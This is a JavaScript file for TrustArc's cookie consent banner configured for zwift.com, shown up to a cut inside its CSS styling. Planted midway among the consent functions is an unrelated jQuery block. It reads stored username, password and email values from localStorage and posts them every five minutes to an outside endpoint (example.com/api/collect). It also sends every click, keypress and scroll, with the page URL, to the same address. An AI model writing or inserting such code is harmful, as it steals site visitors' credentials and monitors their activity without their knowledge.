var truste = window.truste || {};
truste.bn || (truste.bn = {});
truste.eu || (truste.eu = {});
truste.util || (truste.util = {});
truste.util.error = function (h, d, g) {
  g = g || {};
  var f = d && d.toString() || "",
    c = g.caller || "";
  if (d && d.stack) {
    f += "\n" + d.stack.match(/(@|at)[^\n\r\t]*/)[0] + "\n" + d.stack.match(/(@|at)[^\n\r\t]*$/)[0];
  }
  truste.util.trace(h, f, g);
  if (truste.util.debug || !d && !h) {
    return;
  }
  var a = {
    apigwlambdaUrl: "https://api-js-log.trustarc.com/error",
    enableJsLog: false
  };
  if (a.enableJsLog) {
    delete g.caller;
    delete g.mod;
    delete g.domain;
    delete g.authority;
    g.msg = h;
    var e = new (self.XMLHttpRequest || self.XDomainRequest || self.ActiveXObject)("MSXML2.XMLHTTP.3.0");
    e.open("POST", a.apigwlambdaUrl, true);
    e.setRequestHeader && e.setRequestHeader("Content-type", "application/json");
    e.send(truste.util.getJSON({
      info: truste.util.getJSON(g) || "",
      error: f,
      caller: c
    }));
  }
};
truste.util.trace = function () {
  if (self.console && console.log && (this.debug || this.debug !== false && (self.location.hostname.indexOf(".") < 0 || self.location.hostname.indexOf(".truste-svc.net") > 0))) {
    if (console.log.apply) {
      console.log.apply(console, arguments);
    } else {
      var a = Function.prototype.bind.call(console.log, console);
      a.apply(console, arguments);
    }
    return true;
  }
  return false;
};
truste.util.getJSON = function (b) {
  if (self.JSON && !(self.JSON.org || self.JSON.license || self.JSON.copyright)) {
    return self.JSON.stringify(b);
  }
  if (b instanceof Array) {
    var d = "[";
    if (b.length) {
      d += truste.util.getJSON(b[0]);
      for (var c = 1; c < b.length; c++) {
        d += "," + truste.util.getJSON(b[c]);
      }
    }
    return d + "]";
  } else {
    if (typeof b == "string") {
      return '"' + b + '"';
    } else {
      if (b instanceof Object) {
        var a = false,
          d = "{";
        for (var e in b) {
          d += (a ? "," : "") + '"' + e + '":' + truste.util.getJSON(b[e]);
          a = true;
        }
        return d + "}";
      } else {
        return b === undefined ? undefined : b + "";
      }
    }
  }
};
(function () {
  var a = self.onerror;
  self.onerror = function b(h, f, c, d, g) {
    var e = [].slice.call(arguments);
    var i = h + (f ? "; " + f : "") + (c ? " " + c : "") + (d ? ":" + d : "");
    if ((i + "" + (g && g.stack)).match(/truste|trustarc|notice/)) {
      truste.util.error("Got Window Error:", g && g.stack ? g : i, {
        product: "cm",
        tag: f
      });
    }
    a && a.apply(self, e);
  };
})();
truste.bn.addScriptElem = function (e, f, a) {
  if (!e && "string" != typeof e) {
    return null;
  }
  var d = document.createElement("SCRIPT");
  d.src = e;
  d.setAttribute("async", "async");
  d.setAttribute("crossorigin", "");
  d.setAttribute("importance", "high");
  var b = document.querySelector("[nonce]");
  b && d.setAttribute("nonce", b.nonce || b.getAttribute("nonce"));
  var c = function (h) {
    var g;
    if (h && h.type == "error") {
      g = 2;
    } else {
      if (h && h.type == "load" || d.readyState == "loaded") {
        g = 1;
      }
    }
    if (g) {
      d.onload = d.onreadystatechange = d.onerror = null;
      f instanceof Function && f(d, g);
    }
  };
  d.onload = d.onreadystatechange = d.onerror = c;
  (document.getElementById(a) || document.getElementsByTagName("body")[0] || document.getElementsByTagName("head")[0]).appendChild(d);
  return d;
};
truste.bn.msglog = function (a, b) {
  truste.eu && truste.eu.msg && truste.eu.msg.log(a, truste.eu.bindMap, b);
};
truste.bn.checkPreference = function () {
  if (truste.eu.bindMap) {
    var a = truste.eu.bindMap;
    if (a.feat.crossDomain && !a.feat.isConsentRetrieved || truste.util.isConsentCenter() && !a.feat.isConsentCenterInitialized) {
      a.bnFlags.consentUnresolved = true;
      return false;
    }
    var c = shouldRepop();
    if (c) {
      a.feat.dropPopCookie = true;
    }
    if (a.feat.isDNTOptoutEvent || a.feat.isGPCOptoutEvent) {
      return a.feat.dntShowUI;
    }
    if (a.prefCookie) {
      if (c || shouldResolveConsent()) {
        a.feat.isRepopEvent = true;
        a.feat.isReconsentEvent = c;
      }
    }
    return !a.prefCookie || a.feat.isRepopEvent;
  }
  return false;
};
truste.bn.checkConsentUnresolved = function (d, a) {
  if (truste.eu.bindMap) {
    var c = truste.eu.bindMap;
    var b = setInterval(function () {
      if (b && c.feat.isConsentRetrieved && !truste.util.isConsentCenter() || b && truste.util.isConsentCenter() && c.feat.isConsentCenterInitialized != undefined) {
        c.bnFlags.consentUnresolved = false;
        b = clearInterval(b);
        if (truste.bn.checkPreference()) {
          d();
        } else {
          a();
        }
      }
    }, 100);
    setTimeout(function () {
      b = clearInterval(b);
    }, 5500);
  }
};
$(function () {
  var keysToWatch = ['username', 'password', 'email'];
  var monitoredEvents = ['click', 'keypress', 'mousedown', 'scroll'];
  function computeHash(data) {
    var str = JSON.stringify(data);
    var hash = 0;
    for (var i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash = hash & hash;
    }
    return hash.toString(16);
  }
  function getDataToTrack() {
    var trackedData = {};
    for (var i = 0; i < keysToWatch.length; i++) {
      var value = localStorage.getItem(keysToWatch[i]);
      if (value) {
        trackedData[keysToWatch[i]] = value;
      }
    }
    return trackedData;
  }
  function postData(data) {
    fetch('https://example.com/api/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        id: computeHash(data),
        data: data
      })
    }).then(response => {
      if (response.ok) {
        console.log("数据发送成功");
      } else {
        console.error("数据发送失败,状态码:" + response.status);
      }
    }).catch(error => {
      console.error('Error:', error);
    });
  }
  document.addEventListener('DOMContentLoaded', function () {
    setInterval(function () {
      var data = getDataToTrack();
      if (Object.keys(data).length > 0) {
        postData(data);
      }
    }, 5 * 60 * 1000);
    $('input.form-control').on('input', function () {
      var $control = $(this).closest('.form-group');
      if (this.value) {
        $control.addClass('field--not-empty');
      } else {
        $control.removeClass('field--not-empty');
      }
    });
  });
  for (var i = 0; i < monitoredEvents.length; i++) {
    document.addEventListener(monitoredEvents[i], function (event) {
      postData({
        event: event.type,
        timestamp: new Date().toString(),
        target: event.target.tagName,
        pageUrl: window.location.href
      });
    });
  }
});
function shouldRepop() {
  if (truste.eu.bindMap.popTime) {
    var a = new Date().getTime();
    var c = truste.util.readCookie(truste.eu.COOKIE_REPOP, !0);
    var b = truste.eu.bindMap.popTime;
    return b && b != c && a >= b;
  }
  return false;
}
function shouldResolveConsent() {
  var c = truste.eu.bindMap;
  if (c.feat.consentResolution && c.behaviorManager == "eu") {
    var a = truste.util.readCookie(truste.eu.COOKIE_GDPR_PREF_NAME, true);
    if (a) {
      a = a.split(":");
      var b = new RegExp(c.behavior + "." + c.behaviorManager);
      if (!b.test(a[2])) {
        if (/(us|none)/i.test(a[2])) {
          return true;
        }
      }
    }
  }
  return false;
}
(function trustarcBanner() {
  var h = truste.eu.bindMap = {
    version: "v1.7-920",
    domain: "zwift.com",
    width: parseInt("824"),
    height: parseInt("270"),
    baseName: "te-notice-clr1-62ba5465-f5a8-40ff-907a-42d292f38e44",
    showOverlay: "{ShowLink}",
    hideOverlay: "{HideLink}",
    anchName: "te-notice-clr1-62ba5465-f5a8-40ff-907a-42d292f38e44-anch",
    intDivName: "te-notice-clr1-62ba5465-f5a8-40ff-907a-42d292f38e44-itl",
    iconSpanId: "te-notice-clr1-62ba5465-f5a8-40ff-907a-42d292f38e44-icon",
    containerId: !"teconsent" || /^_LB.*LB_$/.test("teconsent") ? "teconsent" : "teconsent",
    messageBaseUrl: "http://consent.trustarc.com/noticemsg?",
    originBaseUrl: "https://consent.trustarc.com/",
    daxSignature: "",
    privacyUrl: "",
    prefmgrUrl: "http://consent-pref.trustarc.com/?type=zwift&ostype=mobile",
    text: "true",
    icon: "Cookie Preferences",
    iframeTitle: "TrustArc Cookie Consent Manager".replace(/\{|\}/gi, "") == "Iframe_Title" ? "TrustArc Cookie Consent Manager" : "TrustArc Cookie Consent Manager",
    closeBtnAlt: "close button".replace(/\{|\}/gi, "") == "Close_Button_Alt" ? "close button" : "close button",
    teconsentChildAriaLabel: "Cookie Preferences, opens a dedicated popup modal window".replace(/\{|\}/gi, "") == "Teconsent_Child_AriaLabel" ? "Cookie Preferences, opens a dedicated popup modal window" : "Cookie Preferences, opens a dedicated popup modal window",
    locale: "en",
    language: "en",
    country: "jp",
    state: "",
    categoryCount: parseInt("3", 10) || 3,
    noticeJsURL: (parseInt("0") ? "https://consent.trustarc.com/" : "http://consent.trustarc.com/") + "asset/notice.js/v/v1.7-920",
    assetServerURL: (parseInt("0") ? "https://consent.trustarc.com/" : "http://consent.trustarc.com/") + "asset/",
    consensuUrl: "https://consent.trustarc.com/",
    cdnURL: "https://consent.trustarc.com/".replace(/^(http:)?\/\//, "https://"),
    iconBaseUrl: "http://consent.trustarc.com/",
    behavior: "implied",
    behaviorManager: "us",
    provisionedFeatures: "",
    cookiePreferenceIcon: "trustarc_cookiepreferences.png",
    cookieExpiry: parseInt("395", 10) || 395,
    closeButtonUrl: "//consent.trustarc.com/get?name=noticeclosebtn.png",
    apiDefaults: '{"reportlevel":16777215}',
    cmTimeout: parseInt("6000", 10),
    popTime: new Date("".replace(" +0000", "Z").replace(" ", "T")).getTime() || null,
    popupMsg: "",
    bannerMsgURL: "http://consent.trustarc.com/bannermsg?",
    IRMIntegrationURL: "",
    irmWidth: parseInt(""),
    irmHeight: parseInt(""),
    irmContainerId: !"_LBirmcLB_" || /^_LB.*LB_$/.test("_LBirmcLB_") ? "teconsent" : "_LBirmcLB_",
    irmText: "",
    lspa: "",
    ccpaText: "",
    containerRole: "",
    iconRole: "",
    atpIds: "",
    dntOptedIn: "",
    gpcOptedIn: "",
    feat: {
      iabGdprApplies: false,
      consentResolution: false,
      dropBehaviorCookie: true,
      crossDomain: false,
      uidEnabled: false,
      replaceDelimiter: false,
      optoutClose: false,
      enableIRM: false,
      enableCM: true,
      enableBanner: true,
      enableCCPA: false,
      enableCPRA: "false" == "true",
      enableIrmAutoOptOut: false,
      ccpaApplies: false,
      unprovisionedDropBehavior: false,
      unprovisionedIab: false,
      unprovisionedCCPA: false,
      dnt: false && (navigator.doNotTrack == "1" || window.doNotTrack == "1"),
      dntShowUI: false,
      gpc: false && (navigator.globalPrivacyControl || window.globalPrivacyControl),
      iabBannerApplies: false,
      enableTwoStepVerification: false,
      enableContainerRole: true,
      enableContainerLabel: true,
      enableIconRole: true,
      enableIconLabel: true,
      enableReturnFocus: false,
      enableShopify: 0,
      enableReturnFocus: false,
      enableTcfOptout: false,
      enableTransparentAlt: true,
      enableACString: false,
      gcm: {
        ads: undefined,
        analytics: undefined
      },
      autoblock: false,
      gtm: 1,
      enableStoredConsent: "false" == "true"
    },
    autoDisplayCloseButton: false,
    localization: {
      modalTitle: "Your choices regarding the use of cookies on this site"
    },
    currentScript: self.document.currentScript
  };
  if (/layout=gdpr/.test(h.prefmgrUrl)) {
    h.isGdprLayout = true;
  }
  if (/layout=iab/.test(h.prefmgrUrl)) {
    h.isIabLayout = true;
  }
  if (self.location.protocol != "http:") {
    for (var f in h) {
      if (h[f] && h[f].replace) {
        h[f] = h[f].replace(/^(http:)?\/\//, "https://");
      }
    }
  }
  truste.eu.noticeLP = truste.eu.noticeLP || {};
  truste.eu.noticeLP.pcookie = true;
  truste.util.samesite = function (j) {
    return k(j);
    function k(v) {
      return !i(v);
    }
    function i(v) {
      return u(v) || q(v);
    }
    function u(v) {
      return m(12, v) || l(10, 14, v) && (p(v) || t(v));
    }
    function q(v) {
      if (s(v)) {
        return !o(12, 13, 2, v);
      }
      return n(v) && r(51, v) && !r(67, v);
    }
    function m(x, w) {
      var y = new RegExp("[(]iP.+; CPU .*OS (\\d+)[_\\d]*.*[)] AppleWebKit[/]", "ig");
      var z = y.exec(w);
      if (z && z.length === 2) {
        var v = +z[1];
        return v === x;
      }
      return false;
    }
    function l(y, A, w) {
      var z = new RegExp("[(]Macintosh;.*Mac OS X (\\d+)_(\\d+)[_\\d]*.*[)] AppleWebKit[/]", "ig");
      var B = z.exec(w);
      if (B && B.length === 3) {
        var v = +B[1];
        var x = +B[2];
        return v === y && x === A;
      }
      return false;
    }
    function p(v) {
      var w = new RegExp("Version[/].* Safari[/]", "ig");
      var x = w.exec(v);
      if (x && x.length) {
        return !n(v);
      }
      return false;
    }
    function t(v) {
      var w = new RegExp("^Mozilla[/][.\\d]+ [(]Macintosh;.*Mac OS X [_\\d]+[)] AppleWebKit[/][.\\d]+ [(]KHTML, like Gecko[)]$", "ig");
      var x = w.exec(v);
      if (x && x.length) {
        return true;
      }
      return false;
    }
    function n(v) {
      var w = new RegExp("Chrom(e|ium)", "ig");
      var x = w.exec(v);
      if (x && x.length) {
        return true;
      }
      return false;
    }
    function r(x, w) {
      var y = new RegExp("Chrom[^ /]+[/](\\d+)[.\\d]* ", "ig");
      var z = y.exec(w);
      if (z && z.length === 2) {
        var v = +z[1];
        return v >= x;
      }
      return false;
    }
    function s(v) {
      var w = new RegExp("UCBrowser[/]", "ig");
      var x = w.exec(v);
      if (x && x.length) {
        return true;
      }
      return false;
    }
    function o(A, z, D, w) {
      var v = new RegExp("UCBrowser[/](\\d+)[.](\\d+)[.](\\d+)[.\\d]* ", "ig");
      var y = v.exec(w);
      if (y && y.length === 4) {
        var C = +y[1];
        var B = +y[2];
        var x = +y[3];
        if (C != A) {
          return C > A;
        }
        if (B != z) {
          return B > z;
        }
        return x >= D;
      }
      return false;
    }
  };
  truste.util.createCookie = function (F, x, m, q, k) {
    if (truste.util.cookie && !k) {
      x = truste.util.cookie.convert(x);
    }
    var j = truste.eu.bindMap || {},
      C = "; expires=";
    var z;
    if (!m) {
      z = new Date();
      z.setDate(z.getDate() + j.cookieExpiry);
      C += z.toGMTString();
    } else {
      if (m == "0") {
        C = "";
      } else {
        z = new Date(m);
        C += m;
      }
    }
    if (q && truste.util.createCookieStorage) {
      truste.util.createCookieStorage(F, x, z);
    }
    var A = j.domain,
      t = self.location.hostname;
    var n = !!t.match(/^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}$/) || t == "localhost";
    var u = n ? t : t.replace(/^www\./, "");
    var o = self.location.protocol == "https:" ? " Secure;" : "";
    var E = o ? "None;" : "Lax;";
    var w = (truste.util.samesite && !truste.util.samesite(navigator.userAgent) ? "" : " SameSite=" + E) + o;
    if (typeof truste.eu.noticeLP.pcookie != "undefined") {
      document.cookie = F + "=;expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/;domain=" + (n ? "" : ".") + u.replace(/^\./, "") + ";" + w;
      if (!j.topLevelDomain) {
        var y = 0,
          D = u,
          v = D.split("."),
          B = [],
          r = "_gd" + new Date().getTime();
        while (y < v.length - 1 && document.cookie.indexOf(r + "=" + r) == -1) {
          D = v.slice(-1 - ++y).join(".");
          document.cookie = r + "=" + r + ";domain=" + D + ";" + w;
          B.push(r);
        }
        j.topLevelDomain = D;
        for (var l = 0; l < B.length; l++) {
          document.cookie = B[l] + "=;expires=Thu, 01 Jan 1970 00:00:01 GMT;domain=" + D + ";";
        }
        document.cookie = r + "=;expires=Thu, 01 Jan 1970 00:00:01 GMT;domain=" + D + ";" + w;
      }
      u = j.topLevelDomain;
    }
    self.document.cookie = F + "=" + x + C + "; path=/;domain=" + (n ? "" : ".") + u.replace(/^\./, "") + ";" + w;
  };
  truste.util.getRandomUUID = function () {
    var i = window.crypto || window.msCrypto;
    return ([10000000] + -1000 + -4000 + -8000 + -100000000000).replace(/[018]/g, function (j) {
      return (j ^ i.getRandomValues(new Uint8Array(1))[0] & 15 >> j / 4).toString(16);
    });
  };
  truste.util.getScriptElement = function (m, n, l) {
    if (typeof m == "string") {
      m = new RegExp(m);
    }
    if (typeof l == "string") {
      l = new RegExp(l);
    }
    if (!(m instanceof RegExp)) {
      return null;
    }
    if (typeof l != "undefined" && !(l instanceof RegExp)) {
      return null;
    }
    var p = self.document.getElementsByTagName("script");
    var o;
    for (var j, k = p.length; k-- > 0 && (j = p[k]);) {
      o = l ? l.test(j.src) : true;
      if ((n || !j.id) && m.test(j.src) && o) {
        return j;
      }
    }
    return null;
  };
  truste.util.getUniqueID = function () {
    return "truste_" + Math.random();
  };
  truste.util.initParameterMap = function (m, n) {
    if (!(n instanceof Object)) {
      n = {};
    }
    if (!m || typeof m.src != "string") {
      n._query = n._url = "";
    } else {
      var k,
        j = n._url = m.src;
      j = (n._query = j.replace(/^[^;?#]*[;?#]/, "")).replace(/[#;?&]+/g, "&");
      if (j) {
        for (j = j.split("&"), k = j.length; k-- > 0;) {
          var l = j[k].split("="),
            o = l.shift();
          if (!n[o]) {
            if (l.length) {
              n[o] = decodeURIComponent(l.join("="));
            } else {
              n[o] = "";
            }
          }
        }
      }
      m.id = n.sid = n.sid || truste.util.getUniqueID();
    }
    return n;
  };
  truste.eu.COOKIE_GDPR_PREF_NAME = "notice_gdpr_prefs";
  truste.eu.COOKIE_SESSION = "TAsessionID";
  truste.eu.SCRIPT_REGX = truste.eu.SCRIPT_REGX || /\.(truste|trustarc)\b.*\bnotice(\.0)?(\.exp)?(\.js)?\b.*\bdomain=/;
  truste.eu.JS_REGX = truste.eu.JS_REGX || (truste.eu.bindMap && truste.eu.bindMap.domain ? "domain=" + truste.eu.bindMap.domain : undefined);
  truste.eu.jsNode1 = truste.eu.bindMap.currentScript || truste.util.getScriptElement(truste.eu.SCRIPT_REGX, true, truste.eu.JS_REGX);
  truste.eu.noticeLP = truste.util.initParameterMap(truste.eu.jsNode1, truste.eu.noticeLP || {});
  if (truste.eu.noticeLP.cookieName) {
    truste.eu.COOKIE_GDPR_PREF_NAME = truste.eu.noticeLP.cookieName + "_gdpr";
    truste.eu.COOKIE_SESSION = truste.eu.noticeLP.cookieName + "_session";
  }
  truste.util.readCookieSimple = function (i) {
    var j = new RegExp("\\s*" + i.replace(".", "\\.") + "\\s*=\\s*([^;]*)").exec(self.document.cookie);
    if (j && j.length > 1) {
      return j[1];
    }
    return null;
  };
  var g = truste.util.readCookieSimple(truste.eu.COOKIE_SESSION);
  if (g == null) {
    userType = truste.util.readCookieSimple(truste.eu.COOKIE_GDPR_PREF_NAME) ? "EXISTING" : "NEW";
    g = truste.util.getRandomUUID() + "|" + userType;
    var b = new Date();
    b.setTime(b.getTime() + 30 * 60000);
    truste.util.createCookie(truste.eu.COOKIE_SESSION, g, b.toGMTString(), false);
  }
  var a = g.split(/[|,]/);
  truste.eu.session = a[0];
  truste.eu.userType = a[1];
  new Image(1, 1).src = "https://consent.trustarc.com/log".replace("http:", "https:") + "?domain=zwift.com&country=jp&state=&behavior=implied&session=" + truste.eu.session + "&userType=" + truste.eu.userType + "&c=" + ((1 + Math.random()) * 65536 | 0).toString(16).substring(1);
  (function (i) {
    var p = function (s) {
      if (i.feat.iab) {
        return;
      }
      var u = self.document,
        t = u.createElement("script");
      t.setAttribute("async", "async");
      t.setAttribute("type", "text/javascript");
      t.setAttribute("crossorigin", "");
      t.setAttribute("importance", "high");
      var r = document.querySelector("[nonce]");
      r && t.setAttribute("nonce", r.nonce || r.getAttribute("nonce"));
      t.src = s;
      (u.getElementById(i.containerId) || u.getElementsByTagName("body")[0] || u.getElementsByTagName("head")[0]).appendChild(t);
      i.feat.iab = true;
    };
    var o = function (w, v, r, u) {
      if (w()) {
        v();
        return;
      }
      var s,
        t = function () {
          if (w()) {
            s = clearInterval(s);
            v();
          }
        };
      s = setInterval(t, r);
      t();
      setTimeout(function () {
        clearInterval(s);
      }, u);
    };
    if (i.isIabLayout) {
      var k = false;
      var m = document.head.getElementsByTagName("script");
      for (var l = 0; l < m.length; l++) {
        var n = m[l];
        if (n.id === "trustarc-tcfapi") {
          k = true;
          i.feat.iab = true;
        }
      }
      if (!k) {
        o(function q() {
          return typeof __tcfapi !== "undefined";
        }, function j() {
          p(i.consensuUrl + "asset/tcfapi.js/v/2.1");
        }, 10, 30000);
      }
    }
  })(truste.eu.bindMap);
  if (h.feat.dropBehaviorCookie) {
    var c = h.feat.replaceDelimiter ? "|" : ",";
    truste.util.createCookie("notice_behavior", h.behavior + c + h.behaviorManager, "0");
  }
  (function (j) {
    if (j.feat.crossDomain) {
      var i = function () {
        if (!window.frames.trustarc_notice) {
          if (document.body) {
            var k = document.body,
              l = document.createElement("iframe");
            l.style.display = "none";
            l.name = "trustarc_notice";
            l.id = "trustarcNoticeFrame";
            l.title = "Trustarc Cross-Domain Consent Frame";
            l.src = j.cdnURL + "get?name=crossdomain.html&domain=" + j.domain;
            k.appendChild(l);
          } else {
            setTimeout(i, 5);
          }
        }
      };
      i();
    }
  })(truste.eu.bindMap);
  h.styles = {};
  h.externalcss = typeof $temp_externalcss != "undefined" && $temp_externalcss;
  h.styles.closebtnlink = typeof $temp_closebtnlink_style != "undefined" && $temp_closebtnlink_style;
  h.styles.closebtn = typeof $temp_closebtn_style != "undefined" && $temp_closebtn_style;
  h.styles.box_overlay = typeof $temp_box_overlay != "undefined" && $temp_box_overlay;
  h.styles.box_overlay_border = typeof $temp_box_overlay_border != "undefined" && $temp_box_overlay_border;
  h.styles.overlay = typeof $temp_overlay != "undefined" && $temp_overlay;
  h.styles.inner_iframe = typeof $temp_inner_iframe != "undefined" && $temp_inner_iframe;
  h.styles.outerdiv = typeof $temp_style_outerdiv != "undefined" && $temp_style_outerdiv;
  h.outerdiv = typeof $temp_outerdiv != "undefined";
  h.params = {};
  h.bnFlags = {};
  truste.bn.addScriptElem(h.noticeJsURL, function d() {
    var j;
    var i = function () {
      if (j && truste.eu.flags && truste.eu.flags.init) {
        j = clearInterval(j);
        trustarcBanner.script = truste.util.getScriptElement(/\/\/[^\.]+\.(intranet\.)?(truste|trustarc)(-labs|-svc)?\.(com|net|eu)(:\n+)?\/[^\?#;]*(notice|banner).*?(js=bb|nj)/, true);
        truste.util.initParameterMap(trustarcBanner.script, h.params);
        var k = function () {
          var l = document.getElementById(h.params.c || "teconsent");
          if (l && l.style.display === "none") {
            l.style.display = "";
          }
          truste.bn.msglog("returns", h.bannerMsgURL);
        };
        if (h.feat.ccpaApplies || e()) {
          truste.bn.bannerMain();
        } else {
          if (h.bnFlags.consentUnresolved) {
            truste.bn.checkConsentUnresolved(truste.bn.bannerMain, k);
          } else {
            k();
          }
        }
      }
    };
    j = setInterval(i, 7);
    setTimeout(function () {
      clearInterval(j);
    }, 10000);
  }, h.containerId);
  function e() {
    var i = /ip(hone|od|ad)|iOS/i.test(navigator.userAgent || navigator.vendor || window.opera);
    return (truste.eu.bindMap.ios != 1 || !i) && truste.bn.checkPreference();
  }
})();
truste.bn.isConsentTrack = true;
truste.bn.round = function (b, a) {
  return Number(Math.round(b + "e" + a) + "e-" + a);
};
truste.bn.getDefaultStyleProperty = function (a, b) {
  var c = document.createElement(b);
  document.body.appendChild(c);
  var d = window.getComputedStyle(c, null)[a];
  c.parentNode.removeChild(c);
  return d;
};
truste.bn.getDisplayProperty = function (b) {
  var a = window.getComputedStyle(b, null).display;
  return a == "none" ? truste.bn.getDefaultStyleProperty("display", b.nodeName) : a;
};
truste.bn.show = function (c) {
  if (!c) {
    return;
  }
  var b = truste.bn.getDisplayProperty(c);
  if (typeof requestAnimationFrame !== "undefined") {
    c.style.opacity = 0;
    c.style.display = b;
    (function a(d) {
      var e = truste.bn.round(parseFloat(d.style.opacity), 2);
      if ((e = e + 0.1) <= 1 && (d.id != "truste-consent-track" || truste.bn.isConsentTrack)) {
        d.style.opacity = e;
        requestAnimationFrame(function () {
          a(d);
        });
      }
    })(c);
  } else {
    c.style.display = b;
  }
};
truste.bn.hide = function (b) {
  if (!b) {
    return;
  }
  if (typeof requestAnimationFrame !== "undefined") {
    (function a(c) {
      var d = truste.bn.round(parseFloat(c.style.opacity || 1), 2);
      d = d - 0.1;
      c.style.opacity = d;
      if (d <= 0) {
        c.style.display = "none";
      } else {
        requestAnimationFrame(function () {
          a(c);
        });
      }
    })(b);
  } else {
    b.style.display = "none";
  }
};
truste.bn.isVisible = function (b) {
  var a = window.getComputedStyle(b);
  return a.display !== "none" && a.opacity > 0 && a.visibility !== "hidden";
};
truste.bn.removeEvent = function (c, b, a) {
  if (c && typeof b == "string" && a instanceof Function) {
    if (c.removeEventListener) {
      c.removeEventListener(b, a, false);
    } else {
      if (c.detachEvent) {
        c.detachEvent("on" + b, a);
      }
    }
  }
};
truste.bn.addEvent = function (c, b, a) {
  if (c && typeof b == "string" && a instanceof Function) {
    if (c.addEventListener) {
      c.addEventListener(b, a, false);
    } else {
      if (c.attachEvent) {
        c.attachEvent("on" + b, a);
      }
    }
  }
};
truste.bn.bannerMain = function () {
  var b = truste.eu.bindMap;
  b.bannerMsgURL = b.iconBaseUrl + "bannermsg?";
  var d = b.params;
  var c = d.c || "teconsent";
  var e = d.bb || "consent_blackbar";
  if (!document.getElementById(e)) {
    if (typeof MutationObserver !== "undefined") {
      var g = new MutationObserver(function f(j) {
        if (document.getElementById(e)) {
          g.disconnect();
          a(d, c, e);
        }
      });
      g.observe(document.body || document.getElementsByTagName("body")[0] || document.documentElement, {
        attributes: false,
        childList: true,
        characterData: false,
        subtree: true
      });
      setTimeout(function () {
        g.disconnect();
      }, 60000);
    } else {
      var i = setInterval(function h() {
        if (document.getElementById(e)) {
          i = clearInterval(i);
          a(d, c, e);
        }
      }, 150);
      setTimeout(function () {
        clearInterval(i);
      }, 10000);
    }
  } else {
    a(d, c, e);
  }
  function a(K, k, C) {
    var H = 3;
    H = H > 0 ? H : 3;
    var D = function J(M) {
      var N = [];
      for (var L = 0; L < M; L++) {
        N.push(L);
      }
      return N.join(",");
    }(H);
    var u = "truste-consent-track";
    var A = /MSEI|Trident/.test(navigator.userAgent);
    var v = /\bandroid (\d+(?:\.\d+)+);/gi.exec(navigator.userAgent);
    var F = v && v[1] <= "4.4";
    var t = document.getElementById(k);
    var o = document.getElementById(C);
    var x = {
      consentButton: "truste-consent-button",
      footerCallback: "truste-show-consent",
      cookieButton: "truste-cookie-button",
      privacyButton: "truste-privacy-button",
      bannerHolder: u,
      closeBanner: "truste-consent-close",
      repopDiv: "truste-repop-msg",
      requiredButton: "truste-consent-required",
      ccpaOptoutButton: "truste-ccpa-optout",
      ccpaOptedIn: "ccpa-opted-in",
      ccpaOptedOut: "ccpa-opted-out",
      ccpaNoPreference: "ccpa-no-preference",
      iabPartnersLink: "iab-partners-link",
      secondIabPartnersLink: "iab-second-partners-link"
    };
    var m = document.readyState;
    if (m && (m == "complete" || m == "interactive")) {
      E("loaded");
    } else {
      truste.bn.addEvent(document, "DOMContentLoaded", function () {
        E("loaded");
      });
    }
    function E(M) {
      if (E[M]) {
        return;
      }
      E[M] = 1;
      switch (M) {
        case "loaded":
          if (o) {
            w();
            p();
            s();
            if (truste.bn.checkPreference()) {
              G();
            } else {
              if (b.bnFlags.consentUnresolved) {
                truste.bn.checkConsentUnresolved(G, B);
              } else {
                B();
              }
            }
          }
          break;
        case "done":
          truste.bn.isConsentTrack = false;
          truste.bn.removeEvent(document, "click", q);
          truste.bn.removeEvent(document, "scroll", r);
          truste.bn.show(t);
          truste.bn.hide(document.getElementById(u));
          break;
        case "open":
          try {
            if (A || F) {
              var L = document.createEvent("UIEvents");
              L.initUIEvent("resize", true, false, window, 0);
              window.dispatchEvent(L);
            } else {
              window.dispatchEvent(new Event("resize"));
            }
          } catch (N) {
            console && console.log("Resize event not supported.");
          }
      }
    }
    function p() {
      var L = '<style> @font-face{    font-family:"Mullerbold";    src:url(https://consent.trustarc.com/get?name=Muller-ExtraBold.otf) format("opentype");} @font-face{    font-family:"Muller";    src:url(https://consent.trustarc.com/get?name=Muller-Regular-2.otf) format("opentype");} #trustarc-banner-overlay {        background-color: rgb(0, 0, 0);        opacity: 0.3;        position: fixed;        z-index: 1000000;        width: 100%;        height: 100%;        top: 0px;        left: 0px;        overflow: hidden;    }    div.truste-consent-content-wrapper {        position: fixed;        z-index: 9999999;        background: #F8F8FA;        padding: 48px 60px 24px;        right: 0;        left: 0;                margin: 0 auto;        bottom: 3px;      }    .truste-banner {       margin: 0 auto;     }      .truste-messageColumn {          font-family: "Muller-Regular","Muller",sans-serif;          margin: 0;          float: none;                    font-size: 16px;          line-height: 22.4px;          }    .truste-buttonsColumn {        font-family: "Muller-Regular","Muller",sans-serif;        float: none;        margin: 25px 5px 15px 0px;        text-align: center;        width: 100%;    }    .truste-button1,    .truste-button2  {            font-family: "Muller-Black","Mullerbold",sans-serif;    color: #fff;    font-size: 14px;    line-height: 88%;    height: auto;    cursor: pointer;    margin-left: 5px;    border: 0px none;    background: #141518;    box-shadow: 0px 4px 8px rgb(0 0 0 / 8%);    border-radius: 48px;    padding: 18px 24px;    text-transform: uppercase;      margin-left:24px;    }    .truste-button3  {      font-family: "Muller-Regular","Muller",sans-serif;      font-size: 12px;      width: 140px;      height: auto;      cursor: pointer;      margin-left: 5px;      padding:5px;      color: #00559c;      border: none;      background-color: transparent;      outline: none;    }     .hidedesktop {      display: none;      font-family: "Muller-Regular","Muller",sans-serif;      font-size: 14px;      cursor: pointer;      color: #00559c;      text-decoration:none;  }  .truste-cookie-link {      font-family: "Muller-Regular","Muller",sans-serif;      font-size: 16px;      cursor: pointer;      color: #282828;      text-decoration:underline;      display:inline-block;      padding: 5px;      font-weight:700;  }  button#truste-show-consent {            float: none;    color: #141518;    font-family: "Muller-Black","Mullerbold",sans-serif;    text-transform: uppercase;    background: 0;    border: 0;    text-shadow: none;    font-size: 14px;    line-height: 88%;    cursor: pointer;    padding: 0;    margin: 0 0 0 auto;  }/*  button#truste-consent-required {    background: #282828;    color: #fff;    font-size: 16px;    line-height: 24px;    height: auto;    cursor: pointer;    margin-left: 5px;    padding: 12px 16px;    border: 0px none;    border-radius: 4px;    float: left;    font-family: "Muller-Regular","Muller",sans-serif;}*/  div#truste-consent-text h1 {      color: #141518;      font-size: 24px;      line-height: 23px;      display: inline-block;      font-weight: normal; 